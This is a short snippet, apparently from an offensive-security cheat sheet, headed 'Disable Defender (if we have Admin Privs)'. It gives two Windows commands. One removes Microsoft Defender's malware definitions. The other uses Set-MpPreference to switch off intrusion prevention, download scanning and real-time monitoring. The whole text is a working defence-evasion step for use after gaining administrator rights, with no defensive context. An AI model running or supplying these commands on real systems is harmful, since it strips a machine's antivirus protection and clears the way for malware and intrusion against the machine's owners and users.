### **Disable Defender (if we have Admin Privs)**

```bash
C:\Program Files\Windows Defender>.\MpCmdRun.exe -removedefinitions -all

Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true

```
